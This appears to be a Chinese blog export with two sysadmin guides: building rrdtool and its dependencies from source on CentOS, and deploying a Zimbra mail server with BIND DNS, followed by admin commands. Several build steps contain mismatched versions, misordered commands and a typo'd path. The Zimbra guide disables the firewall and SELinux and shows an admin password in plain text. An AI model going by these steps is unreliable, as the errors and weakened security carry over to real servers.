fontconfig-2.10.1.tar.gz pixman-0.32.6.tar.gz cairo-1.14.2.tar.gz glib-2.28.6.tar.bz2 pango-1.30.1.tar.xz rrdtool-1.4.7.tar.gz 这里我安装的目录统一 /usr/local/rrdtool操作系统：Cenetos 6.5因为直接安装rrdtool 会提示依赖错误。然后我们按提示依赖，都安装上，就可以了。 这里我先安装（1） 12345678* pkg-config-0.18.tar.gz * 现在版本更新到0.18 最新版本了，我在这里用最新版本安装。* # wget http://pkgconfig.freedesktop.org/releases/pkgconfig-0.18.tar.gz* # tar zxvf pkgconfig-0.18.tar.gz* # cd pkgconfig-0.18* # ./configure --prefix=/usr/local/rrdtool/pkgconfig* # make &amp;&amp; make install * cd .. （2） 1234567* 安装zlib-1.2.8.tar.gz* # wget http://www.zlib.net/zlib-1.2.8.tar.gz* #cd zlib-1.2.8* # tar zxvf zlib-1.2.8.tar.gz * # ./configure -prefix=/usr/local/rrdtool/zlib * # make &amp;&amp; make install * cd .. ( 3 ) 1234567891011121314151617* 安装libpng-1.6.18.tar.gz* wget ftp://ftp.simplesystems.org/pub/libpng/png/src/libpng16/libpng-1.6.18.tar.gz* # cd libpng-1.6.18* # ./configure --prefix=/usr/local/rrdtool/libpng * # make &amp;&amp; make install* cd ..```bash( 4 )```bash* 安装freetype-2.6.tar.gz* # wget http://download.savannah.gnu.org/releases/freetype/freetype-2.6.tar.gz* # tar zxvf freetype-2.6.tar.gz * # cd freetype-2.6* 这里会提示有两个包不存在。 yum 安装下 就行。没安装也没事情。 bzip2: no* # make &amp;&amp; make install ( 5 ) 12345* 安装libxml2-2.6.3.tar.gz* # tar zxvf libxml2-2.6.3.tar.gz* # cd libxml2-2.6.3* # ./configure --prefix=/usr/local/rrdtool/libxml2 * # make &amp;&amp; make install ( 6 ) 123456 * 安装fontconfig-2.10.1.tar.gz* # wget http://www.freedesktop.org/software/fontconfig/release/fontconfig-2.11.94.tar.gz* # tar zxvf fontconfig-2.11.94.tar.gz* # cd fontconfig-2.11.94* # ./configure --prefix=/usr/local/rrdtool/fontconfig --with-freetype-config=/usr/local/rrdtool/freetype/bin/freetype-config --with-expat-lib=/usr/lib64/* make &amp;&amp; make install ( 7 ) 1234* 安装最新版本 pixman-0.32.6.tar.gz* # tar zxvf pixman-0.32.6.tar.gz * # ./configure --prefix=/usr/local/rrdtool/pixman* # make &amp;&amp; make install ( 8 ) 12345678* 安装最新版本cairo-1.14.2.tar.xz*# wget http://www.cairographics.org/releases/cairo-1.14.2.tar.xz *# tar xvf cairo-1.14.2.tar.xz# cd cairo-1.14.2# ./configure --prefix=/usr/local/rrdtool/cairo --enable-xlib=no --enable-xlib-render=no --enable-win32=no# make &amp;&amp; make install ( 9 ) 123456789101112131415* 安装最新版glib-2.34.2.tar.xz * # tar jxvf glib-2.34.2.tar.xz * # cd glib-2.34.2* # ./configure --prefix=/usr/local/rrdtool/glib* * 这里 我安装了 libffi * wget sourceware.org:/pub/libffi/libffi-3.2.1.tar.gzfi * tar zxvf libffi-3.2.1.tar.gz* # ./configure --prefix=/usr/local/rrdtool/libffi* make &amp;&amp; make install * cd..* cd glib-2.34.2* export PKG_CONFIG_PATH=/usr/local/rrdtool/libffi/lib/pkgconfig/* ./configure --prefix=/usr/local/rrdtool/glib --with-libffi-config=/usr/local/rrdtool/libffi/* make &amp;&amp; make install ( 10 ) 1234567891011* 安装最新版 pango-1.30.1.tar.xz* # tar xvf pango-1.30.1.tar.xz * # cd pango-1.30.1* ./configure --prefix=/usr/local/rrdtool/pango * make &amp;&amp; make install( 11) 这里把下载好的rrdtool 安装上就不会报错了。 * # tar zxvf rrdtool-1.4.5.tar.gz* # cd rrdtool-1.4.5* # ./configure --prefix=/usr/local/rrdtool/rrdtoll * # make &amp;&amp; make install* 安装到这里已经全部安装成功了。 安装到这里就基本上完成了，主要是依赖太多，已写成脚本，需要的留言或者微博上发信息给我都可以。","raw":null,"content":null,"categories":[{"name":"Linux","slug":"Linux","permalink":"http://blog.yangcvo.me/categories/Linux/"}],"tags":[{"name":"Linux note","slug":"Linux-note","permalink":"http://blog.yangcvo.me/tags/Linux-note/"}]},{"title":"zimbra邮件系统的环境部署","slug":"Linux笔记/Zimbra/zimbra邮件系统的环境部署","date":"2014-11-24T10:13:30.000Z","updated":"2017-03-14T05:44:37.000Z","comments":true,"path":"2014/11/24/Linux笔记/Zimbra/zimbra邮件系统的环境部署/","link":"","permalink":"http://blog.yangcvo.me/2014/11/24/Linux笔记/Zimbra/zimbra邮件系统的环境部署/","excerpt":"","text":"zimbra本实验以CENTOS6.6 64位为例. 最小化安装外加开发包 1.关闭防火墙1/etc/init.d/iptables stop 这里说下如果没有关闭防火墙，一定要写规则增加iptables内容如下: 1234567891011121314# enable zimbra ports-A INPUT -m state --state NEW -m tcp -p tcp --dport 25 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 110 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 389 -j ACCEPT -s 10.10.10.0/24-A INPUT -m state --state NEW -m tcp -p tcp --dport 443 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 465 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 993 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 995 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 5222 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 7071 -j ACCEPT -s 10.10.10.0/24-A INPUT -m state --state NEW -m tcp -p tcp --dport 873 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 7110 -j ACCEPT-A INPUT -m state --state NEW -m tcp -p tcp --dport 7780 -j ACCEPT 3.修改主机名12vim /etc/sysconfig/networkhostname=mail.benet.com 4.修改/etc/hosts文件12vi/etc/hosts192.168.1.230 mail.benet.com mail 5.停止系统默认邮件服务12chkconfig postfix off/etc/init.d/postfix stop 这里yum安装依赖库 1yum -y install libidn11 curl fetchmail libpcre3 libgmp3c2 libxml2 libstdc++6 openssl perl sysstat libtool-ltdl compat-libstdc* nc file yum -y update 安装依赖组件 1yum install sysstat 6.关闭SELINUX1234567 sed -i 's/^SELINUX=.*/#&amp;/;s/^SELINUXTYPE=.*/#&amp;/;/SELINUX=.*/a SELINUX=disabled' /etc/sysconfig/selinux 上面SELINUX需要重启才能生效。下面的命令实现临时关闭SELinux/usr/sbin/setenforce 0/usr/sbin/setenforce: SELinux is disabled 由于zimbra严重依赖DNS 所以本实验安装一个DNS服务器为zimbar提供服务 bind-9.8.6-P1 安装的这个版本 从这里下载:https://www.isc.org/downloads/ 我这里有编译安装和yum源安装 1yum install bind* 安装过程中会有几个要求输入的地方，都输入y。这里安装的最新版为9.8.2。安装bind，给zimbra提供解析，注意，这个步骤很重要，因为zimbra严重依赖DNS，内部用自己解析，不知道的都转发到公网。 1yum install bind* -y 编辑named.conf文件 vim /var/named/chroot/etc/named/named.conf 内容如下: 1234567891011121314options &#123; directory \"/var/named\"; forwarders &#123; 202.96.134.133; 202.96.128.166; &#125;; &#125;;zone \"lxb.com\" IN &#123; type master; file \"lxb.com.zone\"; allow-update &#123; none; &#125;; &#125;;zone \"0.168.192.in-addr.arpa\" IN &#123; type master; file \"192.168.0.arpa\"; allow-update &#123; none; &#125;; &#125;; 配置文件正确性检查，没有任何提示就表示正确 1named-checkconf /var/named/chroot/etc/named/named.conf 创建正向解析文件 1vim /var/named/chroot/var/named/lxb.com.zone 内容如下 123456789101112$TTL 86400@ IN SOA lxb.com. root.lxb.com. ( 20110308 3H ; refresh 15M ; retry 1W ; expiry 1D ) ; minimum@ IN NS lxb.com. IN A 192.168.0.1 IN MX 10 mail.lxb.com.mail IN A 192.168.0.1* IN A 192.168.0.1 创建反向解析文件 1vim /var/named/chroot/var/named/192.168.0.arpa 内容如下 1234567891011$TTL 86400@ IN SOA lxb.com. root.lxb.com. ( 20110308 3H ; refresh 15M ; retry 1W ; expiry 1D ) ; minimum IN NS lxb.com. IN A 192.168.0.1 IN MX 10 mail.lxb.com.1 IN PTR mail.lxb.com. 解析文件正确性检查，出现OK提示就表示正确 12named-checkzone lxb.com /var/named/chroot/var/named/lxb.com.zonenamed-checkzone lxb.com /var/named/chroot/var/named/192.168.0.arpa 把原来的配置文件改名，应用刚才创建的配置文件 1234mv /etc/named.conf named.conf.bakln -s /var/named/chroot/etc/named/named.conf /etc/service named startchkconfig named on 解析测试： 3、若其他计算机设置该DNS地址后却无法解析，需修改iptabls规则，将tcp和udp的53端口开放。 vi /etc/sysconfig/iptables，在其中加入： 12-A INPUT -m state --state NEW -m tcp -p tcp --dport 53 -j ACCEPT-A INPUT -m state --state NEW -m udp -p udp --dport 53 -j ACCEPT 修改完成后，重启iptables： 1#service iptables restart 8、解压安装文件123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051[root@zcs soft]# tar -xzvf /mnt/nfs/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059.tgz zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-apache-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-core-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-ldap-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-logger-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-memcached-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-mta-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-proxy-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-snmp-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-spell-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/packages/zimbra-store-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpmzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/bin/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/bin/get_plat_tag.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/bin/zmdbintegrityreportzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/data/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/data/versions-init.sqlzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/YPL.txtzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/zcl.txtzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/zimbra_public_eula_2.1.txtzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/oracle_jdk_eula.txtzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/admin.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/Fedora Server Config.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/Import_Wizard_Outlook.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/Migration_Exch_Admin.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/Migration_Exch_User.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/MigrationWizard_Domino.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/MigrationWizard.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/OSmultiserverinstall.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/quick_start.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/RNZCSO_2005Beta.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/User Instructions for ZCS Import Wizard.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/Zimbra iCalendar Migration Guide.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/Zimbra_Release_Note.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/Zimbra Schema.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/docs/en_US/zimbra_user_guide.pdfzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/modules/zcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/modules/getconfig.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/modules/packages.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/modules/postinstall.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/addUser.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/globals.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/util/utilfunc.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/readme_source_en_US.txtzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/readme_binary_en_US.txtzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/install.shzcs-8.0.2_GA_5569.RHEL6_64.20121210115059/README.txt 9、安装由于是centos使用redhat安装包，所以安装要添加参数–platform-override 1./install.sh --platform-override 安装过程，主要是“Create domain“改变域名为qzalab.cn；修改管理员密码3-&gt;4-&gt;r-&gt;a；本安装是把所有服务安装在一台服务器上，分布式的安装请参考其他资料。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308309310311312313314315316317318319320321322323324325326327328329330331332333334335336337338339340341342343344345346347348349350351352353354355356357358359360361362363364365366367368369370371372373374375376377378379380381382383384385386387388389390391392393394395396397398399400[root@zcs zcs-8.0.2_GA_5569.RHEL6_64.20121210115059]# ./install.sh --platform-overrideOperations logged to /tmp/install.log.1317Checking for existing installation... zimbra-ldap...NOT FOUND zimbra-logger...NOT FOUND zimbra-mta...NOT FOUND zimbra-snmp...NOT FOUND zimbra-store...NOT FOUND zimbra-apache...NOT FOUND zimbra-spell...NOT FOUND zimbra-convertd...NOT FOUND zimbra-memcached...NOT FOUND zimbra-proxy...NOT FOUND zimbra-archiving...NOT FOUND zimbra-cluster...NOT FOUND zimbra-core...NOT FOUNDPLEASE READ THIS AGREEMENT CAREFULLY BEFORE USING THE SOFTWARE.ZIMBRA, INC. (\"ZIMBRA\") WILL ONLY LICENSE THIS SOFTWARE TO YOU IF YOUFIRST ACCEPT THE TERMS OF THIS AGREEMENT. BY DOWNLOADING OR INSTALLINGTHE SOFTWARE, OR USING THE PRODUCT, YOU ARE CONSENTING TO BE BOUND BYTHIS AGREEMENT. IF YOU DO NOT AGREE TO ALL OF THE TERMS OF THISAGREEMENT, THEN DO NOT DOWNLOAD, INSTALL OR USE THE PRODUCT.License Terms for the Zimbra Collaboration Suite: http://www.zimbra.com/license/zimbra_public_eula_2.1.htmlDo you agree with the terms of the software license agreement? [N] yOracleLICENSE 略...Last updated May 17, 2011Do you agree with the terms of the software license agreement? [N] yChecking for prerequisites... FOUND: NPTL FOUND: nc-1.84-22 FOUND: sudo-1.7.4p5-13 FOUND: libidn-1.18-2 FOUND: gmp-4.3.1-7 FOUND: /usr/lib64/libstdc++.so.6Checking for suggested prerequisites... FOUND: perl-5.10.1 FOUND: sysstat FOUND: sqlitePrerequisite check complete.Checking for installable packagesFound zimbra-coreFound zimbra-ldapFound zimbra-loggerFound zimbra-mtaFound zimbra-snmpFound zimbra-storeFound zimbra-apacheFound zimbra-spellFound zimbra-memcachedFound zimbra-proxySelect the packages to installInstall zimbra-ldap [Y]Install zimbra-logger [Y]Install zimbra-mta [Y]Install zimbra-snmp [Y]Install zimbra-store [Y]Install zimbra-apache [Y]Install zimbra-spell [Y]Install zimbra-memcached [N] yInstall zimbra-proxy [N] yChecking required space for zimbra-coreChecking space for zimbra-storeInstalling: zimbra-core zimbra-ldap zimbra-logger zimbra-mta zimbra-snmp zimbra-store zimbra-apache zimbra-spell zimbra-memcached zimbra-proxyYou appear to be installing packages on a platform differentthan the platform for which they were built.This platform is CentOS6_64Packages found: RHEL6_64This may or may not work.Using packages for a platform in which they were not designed formay result in an installation that is NOT usable. Your supportoptions may be limited if you choose to continue.Install anyway? [N] yThe system will be modified. Continue? [N] yRemoving /opt/zimbraRemoving zimbra crontab entry...done.Cleaning up zimbra init scripts...done.Cleaning up /etc/ld.so.conf...done.Cleaning up /etc/security/limits.conf...done.Finished removing Zimbra Collaboration Server.Installing packages zimbra-core......zimbra-core-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-ldap......zimbra-ldap-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-logger......zimbra-logger-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-mta......zimbra-mta-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-snmp......zimbra-snmp-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-store......zimbra-store-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-apache......zimbra-apache-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-spell......zimbra-spell-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-memcached......zimbra-memcached-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...done zimbra-proxy......zimbra-proxy-8.0.2_GA_5569.RHEL6_64-20121210115059.x86_64.rpm...doneOperations logged to /tmp/zmsetup.01082013-094551.logInstalling LDAP configuration database...done.Operations logged to /tmp/zmsetup.01082013-094551.logInstalling LDAP configuration database...done.Setting defaults... Interface: 10.10.10.20 Interface: 127.0.0.1 Interface: ::1DNS ERROR - none of the MX records for zcs.qzalab.cnresolve to this hostChange domain name? [Yes] noCreate domain: [zcs.qzalab.cn] qzalab.cn MX: mail.qzalab.cn (10.10.10.20) MX: zcs.qzalab.cn (10.10.10.20) Interface: 10.10.10.20 Interface: 127.0.0.1 Interface: ::1done.Checking for port conflictsMain menu 1) Common Configuration: 2) zimbra-ldap: Enabled 3) zimbra-store: Enabled +Create Admin User: yes +Admin user to create: admin@qzalab.cn ******* +Admin Password UNSET +Anti-virus quarantine user: virus-quarantine.lelx1uqjz@qzalab.cn +Enable automated spam training: yes +Spam training user: spam.2letin98@qzalab.cn +Non-spam(Ham) training user: ham.q94pdr4mo1@qzalab.cn +SMTP host: zcs.qzalab.cn +Web server HTTP port: 80 +Web server HTTPS port: 443 +Web server mode: https +IMAP server port: 7143 +IMAP server SSL port: 7993 +POP server port: 7110 +POP server SSL port: 7995 +Use spell check server: yes +Spell server URL: http://zcs.qzalab.cn:7780/aspell.php +Enable version update checks: TRUE +Enable version update notifications: TRUE +Version update notification email: admin@qzalab.cn +Version update source email: admin@qzalab.cn 4) zimbra-mta: Enabled 5) zimbra-snmp: Enabled 6) zimbra-logger: Enabled 7) zimbra-spell: Enabled 8) zimbra-proxy: Enabled 9) Default Class of Service Configuration: r) Start servers after configuration yes s) Save config to file x) Expand menu q) Quit Address unconfigured (**) items (? - help) 3#这里输入3，修改密码的管理员密码Store configuration 1) Status: Enabled 2) Create Admin User: yes 3) Admin user to create: admin@qzalab.cn ** 4) Admin Password UNSET 5) Anti-virus quarantine user: virus-quarantine.lelx1uqjz@qzalab.cn 6) Enable automated spam training: yes 7) Spam training user: spam.2letin98@qzalab.cn 8) Non-spam(Ham) training user: ham.q94pdr4mo1@qzalab.cn 9) SMTP host: zcs.qzalab.cn 10) Web server HTTP port: 80 11) Web server HTTPS port: 443 12) Web server mode: https 13) IMAP server port: 7143 14) IMAP server SSL port: 7993 15) POP server port: 7110 16) POP server SSL port: 7995 17) Use spell check server: yes 18) Spell server URL: http://zcs.qzalab.cn:7780/aspell.php 19) Enable version update checks: TRUE 20) Enable version update notifications: TRUE 21) Version update notification email: admin@qzalab.cn 22) Version update source email: admin@qzalab.cn Select, or 'r' for previous menu [r] 4#再输入 4，修改密码的管理员密码Password for admin@qzalab.cn (min 6 characters): [220BynXaRx] #管理员密码 benet1006 gosum.comStore configuration 1) Status: Enabled 2) Create Admin User: yes 3) Admin user to create: admin@qzalab.cn 4) Admin Password set 5) Anti-virus quarantine user: virus-quarantine.lelx1uqjz@qzalab.cn 6) Enable automated spam training: yes 7) Spam training user: spam.2letin98@qzalab.cn 8) Non-spam(Ham) training user: ham.q94pdr4mo1@qzalab.cn 9) SMTP host: zcs.qzalab.cn 10) Web server HTTP port: 80 11) Web server HTTPS port: 443 12) Web server mode: https 13) IMAP server port: 7143 14) IMAP server SSL port: 7993 15) POP server port: 7110 16) POP server SSL port: 7995 17) Use spell check server: yes 18) Spell server URL: http://zcs.qzalab.cn:7780/aspell.php 19) Enable version update checks: TRUE 20) Enable version update notifications: TRUE 21) Version update notification email: admin@qzalab.cn 22) Version update source email: admin@qzalab.cn Select, or 'r' for previous menu [r] r#按回车，返回上级菜单Main menu 1) Common Configuration: 2) zimbra-ldap: Enabled 3) zimbra-store: Enabled 4) zimbra-mta: Enabled 5) zimbra-snmp: Enabled 6) zimbra-logger: Enabled 7) zimbra-spell: Enabled 8) zimbra-proxy: Enabled 9) Default Class of Service Configuration: r) Start servers after configuration yes s) Save config to file x) Expand menu q) Quit *** CONFIGURATION COMPLETE - press 'a' to applySelect from menu, or press 'a' to apply config (? - help) a#输入a,应用Save configuration data to a file? [Yes]#回车Save config in file: [/opt/zimbra/config.9262]#回车Saving config in /opt/zimbra/config.9262...done.The system will be modified - continue? [No] yes#输入yesOperations logged to /tmp/zmsetup.01082013-094551.logSetting local config values...done.Initializing core config...Setting up CA...done.Deploying CA to /opt/zimbra/conf/ca ...done.Creating SSL zimbra-store certificate...done.Creating new zimbra-ldap SSL certificate...done.Creating new zimbra-mta SSL certificate...done.Creating new zimbra-proxy SSL certificate...done.Installing mailboxd SSL certificates...done.Installing MTA SSL certificates...done.Installing LDAP SSL certificate...done.Installing Proxy SSL certificate...done.Initializing ldap...done.Setting replication password...done.Setting Postfix password...done.Setting amavis password...done.Setting nginx password...done.Creating server entry for zcs.qzalab.cn...done.Setting Zimbra IP Mode...done.Saving CA in ldap ...done.Saving SSL Certificate in ldap ...done.Setting spell check URL...done.Setting service ports on zcs.qzalab.cn...done.Adding zcs.qzalab.cn to zimbraMailHostPool in default COS...done.Setting zimbraFeatureTasksEnabled=TRUE...done.Setting zimbraFeatureBriefcasesEnabled=FALSE...done.Setting MTA auth host...done.Setting TimeZone Preference...done.Initializing mta config...done.Setting services on zcs.qzalab.cn...done.Creating domain qzalab.cn...done.Setting default domain name...done.Creating domain qzalab.cn...already exists.Creating admin account admin@qzalab.cn...done.Creating root alias...done.Creating postmaster alias...done.Creating user spam.2letin98@qzalab.cn...done.Creating user ham.q94pdr4mo1@qzalab.cn...done.Creating user virus-quarantine.lelx1uqjz@qzalab.cn...done.Setting spam training and Anti-virus quarantine accounts...done.Initializing store sql database...done.Setting zimbraSmtpHostname for zcs.qzalab.cn...done.Configuring SNMP...done.Setting up syslog.conf...done.Starting servers...done.Installing common zimlets... com_zimbra_clientuploader...done. com_zimbra_tooltip...done. com_zimbra_viewmail...done. com_zimbra_srchhighlighter...done. com_zimbra_adminversioncheck...done. com_zimbra_proxy_config...done. com_zimbra_email...done. com_zimbra_date...done. com_zimbra_webex...done. com_zimbra_ymemoticons...done. com_zimbra_phone...done. com_zimbra_cert_manager...done. com_zimbra_attachcontacts...done. com_zimbra_attachmail...done. com_zimbra_bulkprovision...done. com_zimbra_url...done.Finished installing common zimlets.Restarting mailboxd...done.Creating galsync account for default domain...done.You have the option of notifying Zimbra of your installation.This helps us to track the uptake of the Zimbra Collaboration Server.The only information that will be transmitted is: The VERSION of zcs installed (8.0.2_GA_5569_CentOS6_64) The ADMIN EMAIL ADDRESS created (admin@qzalab.cn)Notify Zimbra of your installation? [Yes] yNotifying Zimbra of installation via http://www.zimbra.com/cgi-bin/notify.cgi?VER=8.0.2_GA_5569_CentOS6_64&amp;MAIL=admin@qzalab.cnERROR: Notification failedSetting up zimbra crontab...done.Moving /tmp/zmsetup.01082013-094551.log to /opt/zimbra/logConfiguration complete - press return to exit 10、重启一下zimbra我习惯安装完成之后，重新启动一下zimbra。 123su - zimbrazmcontrol stopzmcontrol start 11、http://zcs.qzalab.cn访问12http://zcs.qzalab.cn访问了管理https://zcs.qzulab.cn:7071 zimbra 邮件服务器管理123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596添加管理员账号：zmprov ca testadmin@test.com password zimbraIsAdminAccount TRUE升级现有账号为管理员： zmprov ma test@test.com zimbraIsAdminAccount TRUE添加普通账号：zmprov ca test@test.com password删除普通账号：zmprov da test@test.com重设密码： zmprov sp test@test.com pawwsord查询mysql密码：zmlocalconfig -s |grep pass |grep mysql查询邮箱使用情况：zmprov gqu mail.test.com查询指定邮箱详细信息：zmprov gmi test@test.com查看最大系统邮件大小： postconf message_size_limit修改最大附件大小：zmprov modifyConfig zimbraMtaMaxMessageSize 2048000 postfix reloadzimbra命令行方式常用的操作将HTTP登陆方式更改为HTTPHTTPS登陆方式$ zmprov ms zimbraMailSSLPort （将HTTPS更改成非443端口）$ zmtlsctl httphttps$ tomcat restartsmtp认证错误的解决zmprov ms `zmhostname` zimbraMtaAuthHost mail.example.com日志服务器错误的解决$ zmprov getConfig zimbraLogHostname$ zmprov modifyConfig zimbraLogHostname mail.domain.com查看系统参数可以通过zmlocalconfig -s命令查看系统的参数$ postconf //查看postfix的所有配置$ zmlocalconfig //查看各种组件的配置信息$ zmlocalconfig -s|grep zimbra_ldap_userdn //查看zimbra帐号在LDAP中的DN$ zmlocalconfig -s|grep zimbra_ldap_userdn //查看zimbra帐号在LDAP中的密码$ zmlocalconfig -s|grep zimbra_mysql //查看mysql的配置信息更改系统最大邮件大小：查看最大系统邮件大小，显示当前系统最大邮件为10M。$ postconf message_size_limitmessage_size_limit = 10240000将系统最大邮件大小更改为20M。$ zmprov modifyConfig zimbraMtaMaxMessageSize 2048000$ postfix reload更改系统最大附件大小：将系统中所有帐户允许最大的附件更改为5M$ zmprov modifyConfig zimbraFileUploadMaxSize 5000000将系统中mail2.domain.com帐户允许最大的附件更改为20M$ zmprov modifyServer mail2.domain.com zimbraFileUploadMaxSize 20000000更改管理员密码：$ zmprov gaaa //列出所有管理员$ zmprov sp //更改管理员密码例如：zmprov sp admin q1w2e3r4 或 zmprov sp admin@wish.com q12e3r4更改LDAP密码：$ ldap status(start)$ zmldappasswd –root newpass （root）$ zmldappasswd newpass (zimbra)更改MYSQL Database密码：$ mysql.server status(start)$ zmmypasswd –root newrootpass$ zmmypasswd newpass更改Logger MYSQL Database密码：$ logmysql.server status(start)$ zmmylogpasswd –root newrootpass (root）$ zmmylogpasswd newpass (zimbra)清空邮箱$ zmmailbox -z -m rootking@wish.net emptyFolder /[inbox][chats][sent][drafts][junk][trash]inbox(收件箱) chats(聊天) snet(已发送邮件) drafts(草稿箱) junk(垃圾邮件) trash(已删除邮件)备份还原LDAP1、备份LDAP(两个命令是相等的)1)、ldapsearch -h 服务器对外的地址 -x -D “uid=zimbra,cn=admins,cn=zimbra” -w 密码 objectclass=* &gt; 201014.ldif2)、ldapsearch -h 服务器对外的地址 -x -D “uid=zimbra,cn=admins,cn=zimbra” -w 密码 &gt; 201014.ldif2、还原LDAPldapadd -h 服务器对外的地址 -x -c -D “uid=zimbra,cn=admins,cn=zimbra” -w 密码 &lt; 20101214.ldif导出导入用户的邮件#!/bin/bashwhile read USERdoTODAY=`date`LOGFILE=”/tmp/bak/backuplog.txt”echo $TODAY &gt;&gt; $LOGFILEecho $USER &gt;&gt; $LOGFILE/opt/zimbra/bin/zmmailbox -z -m $USER gms &gt;&gt; $LOGFILEzmmailbox -z -m $USER@test.com getRestURL “//?fmt=tgz” &gt; /tmp/bak/$USER.tgzdone &lt; /tmp/user.txtPS:user.txt里是用户名，不需要跟域名恢复用户的邮件zmmailbox -z -m $USER@test.com postRestURL “//?fmt=tgz&amp;resolve=reset” tmp/bak/$USER.tgzZimbra之黑名单、白名单由于zimbra采用ClamAV 做防病毒软件和SpamAssassin 